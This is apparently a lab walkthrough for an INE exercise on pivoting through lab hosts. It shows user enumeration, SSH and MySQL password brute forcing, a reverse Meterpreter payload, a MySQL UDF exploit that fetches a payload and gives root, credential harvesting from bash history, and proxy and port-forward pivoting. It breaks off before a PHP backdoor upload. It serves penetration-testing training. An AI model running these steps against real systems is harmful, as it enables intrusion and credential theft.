- Nmap
- Bash shell
- Hydra
- MySQL Client.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

_Check the network interfaces on the attacker machine to gather information about available IP addresses._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.4  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:04  txqueuelen 0  (Ethernet)
        RX packets 779  bytes 86300 (84.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 664  bytes 1819838 (1.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.131.219.2  netmask 255.255.255.0  broadcast 192.131.219.255
        ether 02:42:c0:83:db:02  txqueuelen 0  (Ethernet)
        RX packets 16  bytes 1376 (1.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2344  bytes 16901740 (16.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2344  bytes 16901740 (16.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Scan the local network to identify live hosts, excluding known addresses._

`nmap -sn 192.131.219.0/24 --exclude 192.131.219.1,192.131.219.2`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-23 15:25 IST
Nmap scan report for demo.ine.local (192.131.219.3) ←
Host is up (0.000034s latency). ←
MAC Address: 02:42:C0:83:DB:03 (Unknown)
Nmap done: 254 IP addresses (1 host up) scanned in 1.89 seconds
```

_Verify entries in the `/etc/hosts` file to confirm network mappings and aliases._

`cat /etc/hosts`:
```
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.4        INE
127.0.0.1 AttackDefense-Kali
192.131.219.2   INE
192.131.219.2 INE
192.131.219.3 demo.ine.local ←
192.131.219.2     attacker
```

_Perform a comprehensive port scan on the identified host to discover services running on all ports._

`nmap -Pn -sS -sV 192.131.219.3 -p-`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-23 15:26 IST
Nmap scan report for demo.ine.local (192.131.219.3)
Host is up (0.000023s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0) ←
79/tcp open  finger  Linux fingerd ←
MAC Address: 02:42:C0:83:DB:03 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.57 seconds
```

_Launch Metasploit and search for an auxiliary module to interact with the `finger` service._

`msfconsole -q`

`search finger`, `use auxiliary/scanner/finger/finger_users`, `show options`, `set RHOSTS demo.ine.local`, `set USERS_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt`, `run`:
```
[+] 192.131.219.3:79      - 192.131.219.3:79 - Found user: sysadmin ←
[+] 192.131.219.3:79      - 192.131.219.3:79 - Found user: auditor ←
[+] 192.131.219.3:79      - 192.131.219.3:79 Users found: auditor, sysadmin
[*] demo.ine.local:79     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

_Create a file to list the discovered usernames._

`nano ./users.txt`:
```
sysadmin
auditor
```

_Use Hydra to perform a brute-force attack on SSH service using the discovered usernames and a wordlist for passwords._

`hydra -L ./users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://demo.ine.local -t 4`:
```
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-23 16:32:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 2018 login tries (l:2/p:1009), ~127 tries per task
[DATA] attacking ssh://demo.ine.local:22/
[22][ssh] host: demo.ine.local   login: sysadmin   password: monkey ←
[STATUS] 1185.00 tries/min, 1185 tries in 00:01h, 835 to do in 00:01h, 16 active
[STATUS] 632.50 tries/min, 1265 tries in 00:02h, 755 to do in 00:02h, 16 active
[STATUS] 463.33 tries/min, 1390 tries in 00:03h, 630 to do in 00:02h, 16 active
[STATUS] 376.25 tries/min, 1505 tries in 00:04h, 515 to do in 00:02h, 16 active
[STATUS] 317.40 tries/min, 1587 tries in 00:05h, 433 to do in 00:02h, 16 active
[STATUS] 290.83 tries/min, 1745 tries in 00:06h, 275 to do in 00:01h, 16 active
[STATUS] 260.71 tries/min, 1825 tries in 00:07h, 195 to do in 00:01h, 16 active
[STATUS] 247.75 tries/min, 1982 tries in 00:08h, 38 to do in 00:01h, 16 active
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-08-23 16:40:37
```

_Use SSH to log in to the target machine as the `sysadmin` user using the cracked password._

`ssh sysadmin@demo.ine.local`:
```
The authenticity of host 'demo.ine.local (192.131.219.3)' can't be established.
ED25519 key fingerprint is SHA256:2M6JP0CDtEm6bPNt43BdwubROVJZfkjsE8+Whqw3RZ0.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes ←
Warning: Permanently added 'demo.ine.local' (ED25519) to the list of known hosts.
sysadmin@demo.ine.local's password: ←
Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

<span style="color: #64b5f6;">**Target 1 machine**</span>.

_Verify the identity of the current user to ensure you have logged in as `sysadmin`._

`whoami`:
```
sysadmin ←
```

_Search for files containing the word "flag" to find any potential flags._

`find / -iname "*flag*" 2> /dev/null`:
```
/usr/lib/perl/5.18.2/bits/waitflags.ph
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
```

_Exit the SSH session to return to the attacker machine._

`exit`

<span style="color: #e57373;">**Attacker machine**</span>.

_Set up a reverse Meterpreter shell handler to receive connections._

`search multi/handler`, `use exploit/multi/handler`, `set PAYLOAD linux/x86/meterpreter/reverse_tcp`, `show options`, `set LHOST 192.131.219.2`, `set LPORT 4444`, `exploit -j`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.131.219.2:4444 ←
```

_Create a reverse shell payload using `msfvenom` to be executed on the target machine._

`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.131.219.2 LPORT=4444 -f elf -o ./reverse_shell.elf`:
```
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: ./reverse_shell.elf ←
```

_Transfer the generated payload to the target machine via SCP._

`scp ./reverse_shell.elf sysadmin@demo.ine.local:/tmp/`:
```
[*] exec: scp ./reverse_shell.elf sysadmin@demo.ine.local:/tmp/

sysadmin@demo.ine.local's password: ←
reverse_shell.elf                  100%  207   593.5KB/s   00:00  ← 
```

_Access the target machine again using SSH._

`ssh sysadmin@demo.ine.local`:
```
sysadmin@demo.ine.local's password: ←
Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 6.8.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
Last login: Fri Aug 23 10:41:34 2024 from ine
```

_Verify the presence of the uploaded reverse shell payload in the `/tmp` directory._

`ls -alps /tmp`:
```
total 12
4 drwxrwxrwt 1 root     root     4096 Aug 23 10:31 ./
4 drwxr-xr-x 1 root     root     4096 Aug 23 09:51 ../
0 -rw-r--r-- 1 root     root        0 Aug 23 09:51 ready
4 -rw-r--r-- 1 sysadmin sysadmin  207 Aug 23 10:31 reverse_shell.elf ←
```

_Change the permissions of the reverse shell payload to make it executable._

`chmod +x ./reverse_shell.elf`

_Execute the reverse shell payload in the background to trigger a connection back to the attacker's Meterpreter handler._

`/tmp/reverse_shell.elf &`:
```
[1] 2418
```

```
[*] Sending stage (984904 bytes) to 192.131.219.3
                                                 [*] Meterpreter session 1 opened (192.131.219.2:4444 -> 192.131.219.3:56582 ) at 2024-08-23 16:09:45 +0530 ←
```

_Exit the current SSH session and return to the Metasploit console to interact with the new Meterpreter session._

`exit`

_Interact with the established Meterpreter session to gain control over the target machine._

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target 1 machine**</span>.

_Verify the current user identity in the Meterpreter session._

`getuid`:
```
Server username: sysadmin ←
```

_Check the network interfaces on the target machine to gather more information about the available network connections._

`ifconfig`:
```
Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface  2
============
Name         : ip_vti0
Hardware MAC : 00:00:00:00:00:00
MTU          : 1480
Flags        : NOARP


Interface 9444
============
Name         : eth0
Hardware MAC : 02:42:c0:83:db:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.131.219.3
IPv4 Netmask : 255.255.255.0


Interface 9446
============
Name         : eth1
Hardware MAC : 02:42:c0:12:cf:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.18.207.2 ←
IPv4 Netmask : 255.255.255.0
```

_Review the hosts file on the target machine to confirm network mappings._

`cat /etc/hosts`:
```
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
192.131.219.3   demo.ine.local demo
192.18.207.2    demo.ine.local demo
192.131.219.2 INE
192.131.219.3 demo.ine.local
192.18.207.3    demo1.ine.local demo
```

_Switch the session back to the background to prepare for further operations._

`background`

<span style="color: #e57373;">**Attacker machine**</span>.

_Use the `autoroute` post-exploitation module to add a route to the new subnet discovered via the target's network interfaces._

`search autoroute`, `use post/multi/manage/autoroute`, `show options`, `set SESSION 2`, `set SUBNET 192.18.207.0`, `run`:
```
[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against demo.ine.local ←
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.18.207.0/255.255.255.0 from host's routing table. ←
[+] Route added to subnet 192.131.219.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```

_Set up a SOCKS proxy server to tunnel traffic through the Meterpreter session._

`cat /etc/proxychains4.conf`:
```
# proxychains.conf  VER 4.x
#
#        HTTP, SOCKS4a, SOCKS5 tunneling proxifier with DNS.

...

# ProxyList format
#       type  ip  port [user pass]
#       (values separated by 'tab' or 'blank')
#
#       only numeric ipv4 addresses are valid
#
#
#        Examples:
#
#               socks5  192.168.67.78   1080    lamer   secret
#               http    192.168.89.3    8080    justu   hidden
#               socks4  192.168.1.49    1080
#               http    192.168.39.93   8080
#
#
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 9050 ←
```

`search socks`, `use auxiliary/server/socks_proxy`, `show options`, `set SRVPORT 9050`, `set VERSION 4a`, `run`:
```
[*] Auxiliary module running as background job 4.

[*] Starting the SOCKS proxy server ←
```

_Confirm that the SOCKS proxy server is running and listening on the expected port._

`netstat -antp | grep ":9050"`:
```
tcp        0      0 0.0.0.0:9050            0.0.0.0:*               LISTEN      551/ruby ←
```

_Use proxychains with Nmap to scan the newly discovered subnet, probing for open ports._

`proxychains nmap -Pn -sT -sV 192.18.207.3 -F`:
```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-23 16:42 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.18.207.3:199 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.18.207.3:995 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.18.207.3:554 <--denied

...

[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.18.207.3:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.18.207.3:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.18.207.3:80  ...  OK
Nmap scan report for 192.18.207.3
Host is up (0.0018s latency).
Not shown: 98 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
3306/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1 ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.89 seconds
```

_Create an SSH tunnel to forward the local port 1234 to the MySQL service on the remote machine._

`ssh -4 -L 1234:127.0.0.1:3306 sysadmin@demo.ine.local`:
```
sysadmin@demo.ine.local's password: ←
Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

_Ensure that the local port forwarding is successfully established._

`netstat -antp | grep ":1234"`:
```
tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      436/ssh ←
```

_Use Nmap locally to verify the MySQL service is accessible on the forwarded port._

`nmap -Pn -sS -sV localhost -p 1234`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-23 16:54 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000056s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 5.5.62-0ubuntu0.14.04.1 ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds
```

_Use Metasploit's `mysql_login` auxiliary module to brute-force the root credentials for MySQL._

`search mysql_login`, `use auxiliary/scanner/mysql/mysql_login`, `show options`, `set RHOSTS localhost`, `set RPORT 1234`, `set USERNAME root`, `set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`, `set STOP_ON_SUCCESS true`, `run`:
```
[-] 0.0.0.1:1234          - 0.0.0.1:1234 - Unable to connect: The host (0.0.0.1:1234) was unreachable.
[*] localhost:1234        - Scanned 1 of 2 hosts (50% complete)
[+] 127.0.0.1:1234        - 127.0.0.1:1234 - Found remote MySQL version 5.5.62
[!] 127.0.0.1:1234        - No active DB -- Credential data will not be saved!

...

[-] 127.0.0.1:1234        - 127.0.0.1:1234 - LOGIN FAILED: root:rafael (Incorrect: Access denied for user 'root'@'localhost' (using password: YES))
[-] 127.0.0.1:1234        - 127.0.0.1:1234 - LOGIN FAILED: root:icecream (Incorrect: Access denied for user 'root'@'localhost' (using password: YES))
[-] 127.0.0.1:1234        - 127.0.0.1:1234 - LOGIN FAILED: root:mexico (Incorrect: Access denied for user 'root'@'localhost' (using password: YES))
[-] 127.0.0.1:1234        - 127.0.0.1:1234 - LOGIN FAILED: root:brianna (Incorrect: Access denied for user 'root'@'localhost' (using password: YES))
[+] 127.0.0.1:1234        - 127.0.0.1:1234 - Success: 'root:nirvana' ←
[*] localhost:1234        - Scanned 2 of 2 hosts (100% complete)
[*] Auxiliary module execution completed
```

_Access the MySQL service using the discovered root credentials._

`mysql -h 127.0.0.1 -P 1234 -u root -p`:
```
Enter password: ←
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 46
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
```

_Use Metasploit's `mysql_udf_payload` exploit to upload a UDF (User Defined Function) that will give us a Meterpreter shell on the target._

`search mysql_udf`, `use exploit/multi/mysql/mysql_udf_payload`, `set PAYLOAD linux/x86/meterpreter/reverse_tcp`, `show options`, `set RHOSTS localhost`, `set LPORT 1234`, `show targets`, `set TARGET Linux`, `set LHOST 192.131.219.2`, `set LPORT 5555`, `set PASSWORD nirvana`, `set FORCE_UDF_UPLOAD true`, `exploit -j`:
```
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP handler on 192.131.219.2:5555 
[-] 0.0.0.1:1234 - Exploit failed [unreachable]: Rex::HostUnreachable The host (0.0.0.1:1234) was unreachable.
[*] Exploiting target 127.0.0.1
[*] Started reverse TCP handler on 192.131.219.2:5555 ←
[*] 127.0.0.1:1234 - Checking target architecture...
[*] 127.0.0.1:1234 - Checking for sys_exec()...
[*] 127.0.0.1:1234 - Checking target architecture...
[*] 127.0.0.1:1234 - Checking for MySQL plugin directory...
[*] 127.0.0.1:1234 - Target arch (linux64) and target path both okay.
[*] 127.0.0.1:1234 - Uploading lib_mysqludf_sys_64.so library to /usr/lib/mysql/plugin/pxKsdesd.so...
[*] 127.0.0.1:1234 - Checking for sys_exec()...
[*] 127.0.0.1:1234 - Using URL: http://0.0.0.0:8080/fLbUcHNgONEkg
[*] 127.0.0.1:1234 - Local IP: http://127.0.0.1:8080/fLbUcHNgONEkg
[*] 127.0.0.1:1234 - Client 192.131.219.3 (Wget/1.15 (linux-gnu)) requested /fLbUcHNgONEkg ←
[*] 127.0.0.1:1234 - Sending payload to 192.131.219.3 (Wget/1.15 (linux-gnu))
[*] Sending stage (984904 bytes) to 192.131.219.3
[*] Meterpreter session 1 opened (192.131.219.2:5555 -> 192.131.219.3:43380 ) at 2024-08-23 19:36:17 +0530 ←
```

_List the available Meterpreter sessions and interact with the new session._

`sessions`, `sessions -i 2`

<span style="color: #64b5f6;">**Target 2 machine**</span>.

_Verify the user identity in the new Meterpreter session._

`getuid`:
```
Server username: root ←
```

_Spawn a shell on the target machine and escalate to a more interactive environment using Python._

`shell`

`python -c 'import pty; pty.spawn("/bin/bash")'`

_Search for files containing "flag" in their names to locate any flags._

`find / -iname "*flag*" 2> /dev/null`:
```
/usr/lib/perl/5.18.2/bits/waitflags.ph
/var/lib/mysql/debian-5.5.flag
/proc/sys/kernel/acpi_video_flags
/proc/sys/net/ipv4/fib_notify_on_flag_change
/proc/sys/net/ipv6/fib_notify_on_flag_change
/proc/kpageflags
/root/FLAG1 ←
```

_Display the contents of the first flag to retrieve it._

`cat /root/FLAG1`:
```
39493c859daa977560a8ac0917edb054 ←
```

_Verify the user accounts on the target machine by checking the `/etc/passwd` file._

`cat /etc/passwd`:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
auditor:x:1000:1000:,,,:/home/auditor:/bin/bash ←
sysadmin:x:1001:1001:,,,:/home/sysadmin:/bin/bash ←
```

_List the contents of the `sysadmin` user's home directory to look for sensitive information._

`ls -alps /home/sysadmin`:
```
total 28
4 drwxr-xr-x 1 sysadmin sysadmin 4096 Aug 23 14:16 ./
8 drwxr-xr-x 1 root     root     4096 Jan 25  2022 ../
4 -rw-r--r-- 1 sysadmin sysadmin  220 Jan 25  2022 .bash_logout
4 -rw-r--r-- 1 sysadmin sysadmin 3637 Jan 25  2022 .bashrc
4 drwx------ 2 sysadmin sysadmin 4096 Aug 23 14:16 .cache/
4 -rw-r--r-- 1 sysadmin sysadmin  675 Jan 25  2022 .profile
```

_List the contents of the `auditor` user's home directory to look for sensitive information._

`ls -alps /home/auditor`:
```
total 32
4 drwx------ 1 auditor auditor 4096 Aug 23 14:14 ./
8 drwxr-xr-x 1 root    root    4096 Jan 25  2022 ../
8 -rw-rw-r-- 1 root    root    5992 Aug 23 14:14 .bash_history ←
4 -rw-r--r-- 1 auditor auditor  220 Jan 25  2022 .bash_logout
4 -rw-r--r-- 1 auditor auditor 3637 Jan 25  2022 .bashrc
4 -rw-r--r-- 1 auditor auditor  675 Jan 25  2022 .profile
```

_Check the `bash_history` file of the `auditor` user to find any useful commands or credentials._

`cat /home/auditor/.bash_history`:
```
cd ~/.rbenva
cd ~/.rbenv
git pullrbenv uninstall 2.1.3
rbenv uninstall 2.1.3
nano ~/.bashrc
rm -rf `rbenv root`
sudo -i
apt-get install -y cmake build-essential libreadline6-dev libncurses5-dev
groupadd mysql
useradd -r -g mysql mysql
mkdir -p /usr/local/src/mysql
cd /usr/local/src/mysql
wget http://cdn.mysql.com/Downloads/MySQL-5.6/mysql-5.6.10.tar.gz
tar xvfz mysql-5.6.10.tar.gz
cd mysql-5.6*
mysql -h 192.56.119.3 -u root -pfArFLP29UySm4bZj ←
rm CMakeCache.txt
cmake \
-DCMAKE_INSTALL_PREFIX=/usr/local/mysql-5.6.10 \
-DWITH_INNOBASE_STORAGE_ENGINE=1\
-DDEFAULT_CHARSET=utf8 \
-DDEFAULT_COLLATION=utf8_general_ci \
-DMYSQL_UNIX_ADDR=/tmp/mysql.sock \
-DSYSCONFDIR=/etc \
.
make
make install
cd mysql-5.5.8
PATH=$PATH:/opt/bison/bin   #bison binary should be in your path
/opt/cmake/bin/cmake . -DWITH_ARCHIVE_STORAGE_ENGINE=1 -DWITH_FEDERATED_STORAGE_ENGINE=1 \
-DWITH_BLACKHOLE_STORAGE_ENGINE=1 -DMYSQL_DATADIR=/opt/mysql-5.5.8/data/ \
-DCMAKE_INSTALL_PREFIX=/opt/mysql-5.5.8 -DCURSES_LIBRARY=/opt/ncurses/lib/libncurses.a \
-DCURSES_INCLUDE_PATH=/opt/ncurses/include/ -DHAVE_LIBAIO_H=/opt/libaio/include/ \
-DINSTALL_LAYOUT=STANDALONE -DENABLED_PROFILING=ON \
-DMYSQL_MAINTAINER_MODE=OFF -DWITH_DEBUG=OFF \
-DDEFAULT_CHARSET=utf8 -DENABLED_LOCAL_INFILE=TRUE -DWITH_ZLIB=bundled
make
make install
```

_Check the network interfaces again to confirm the IP address and subnet details._

`ifconfig`:
```
eth0      Link encap:Ethernet  HWaddr 02:42:c0:5a:05:03  
          inet addr:192.18.207.3  Bcast:192.90.5.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:204 errors:0 dropped:0 overruns:0 frame:0
          TX packets:155 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1024201 (1.0 MB)  TX bytes:34958 (34.9 KB)

eth1      Link encap:Ethernet  HWaddr 02:42:c0:38:77:02  
          inet addr:192.56.119.2  Bcast:192.56.119.255  Mask:255.255.255.0 ←
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:25 errors:0 dropped:0 overruns:0 frame:0
          TX packets:8 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:2139 (2.1 KB)  TX bytes:609 (609.0 B)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:57 errors:0 dropped:0 overruns:0 frame:0
          TX packets:57 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:21483 (21.4 KB)  TX bytes:21483 (21.4 KB)
```

_Verify connectivity to another host within the same subnet using `ping`._

`ping -c 3 192.56.119.3`:
```
PING 192.56.119.3 (192.56.119.3) 56(84) bytes of data.
64 bytes from 192.56.119.3: icmp_seq=1 ttl=64 time=0.056 ms
64 bytes from 192.56.119.3: icmp_seq=2 ttl=64 time=0.085 ms
64 bytes from 192.56.119.3: icmp_seq=3 ttl=64 time=0.073 ms

--- 192.56.119.3 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2039ms ←
rtt min/avg/max/mdev = 0.056/0.071/0.085/0.013 ms
```

_Find the path to the `mysql` binary to verify it is available._

`which mysql`:
```
/usr/bin/mysql ←
```

_Use the `mysql` client to connect to another MySQL server found in the previous steps, using the credentials discovered._

`mysql -h 192.56.119.3 -u root -p`:
```
Enter password: fArFLP29UySm4bZj ←

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 45
Server version: 5.5.62-0ubuntu0.14.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

_Exit the current MySQL connection._

`exit`

_Exit the current shell._

`exit`

_Add a route to the new subnet discovered via the current Meterpreter session._

`run autoroute -s 192.56.119.0/24`:
```
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 192.56.119.0/255.255.255.0...
[+] Added route to 192.56.119.0/255.255.255.0 via 192.90.5.3
[*] Use the -p option to list all active routes
```

_List the active routes to confirm the route was successfully added._

`run autoroute -p`:
```
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   192.56.119.0       255.255.255.0      Session 2 ←
```

_Background the current Meterpreter session to continue working on the attacker machine._

`background`

<span style="color: #e57373;">**Attacker machine**</span>.

_Perform a TCP port scan using Metasploit's `portscan/tcp` auxiliary module to identify open ports on the newly added subnet._

`search portscan`, `use auxiliary/scanner/portscan/tcp`, `show options`, `set RHOSTS 192.56.119.3`, `run`:
```
[+] 192.56.119.3:         - 192.56.119.3:80 - TCP OPEN ←
[+] 192.56.119.3:         - 192.56.119.3:3306 - TCP OPEN ←
[*] 192.56.119.3:         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

_Reconnect to the Meterpreter session to set up port forwarding for local access to the remote services._

`sessions -i 2`

<span style="color: #64b5f6;">**Target 2 machine**</span>.

_Set up port forwarding to redirect local traffic on port 4321 to the HTTP service on the remote machine._

`portfwd add -l 4321 -p 80 -r 192.56.119.3`:
```
[*] Local TCP relay created: :4321 <-> 192.56.119.3:80 ←
```

_Background the Meterpreter session to continue working from the attacker machine._

`background`

<span style="color: #e57373;">**Attacker machine**</span>.

_Verify the port forwarding setup by checking the local network connections._

`netstat -antp | grep ":4321"`:
```
tcp        0      0 0.0.0.0:4321            0.0.0.0:*               LISTEN      436/ruby ←
```

_Scan the local forwarded port to verify it is properly serving the HTTP service._

`nmap -Pn -sS -sV 0.0.0.0 -p 4321`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-23 20:37 IST
Nmap scan report for 0.0.0.0
Host is up (0.000040s latency).

PORT     STATE SERVICE VERSION
4321/tcp open  http    Apache httpd 2.4.7 ((Ubuntu)) ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.84 seconds
```

_Use `curl` to access the web service running on the forwarded port to check its content._

`curl http://0.0.0.0:4321`:
```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
   "http://www.w3.org/TR/html4/strict.dtd">
<HTML>
   <HEAD>
      <title>INE Infosec Trainings!</title>
   </HEAD>
   <BODY>
      <P>Website is under development. Stay Tuned!
      <P>You can upload files to /webtemp ←
   </BODY>
</HTML>
```

_Open the web service in a browser to interact with it visually._

`firefox http://0.0.0.0:4321/webtemp &`

_Reconnect to the Meterpreter session to upload a PHP backdoor onto the web server._

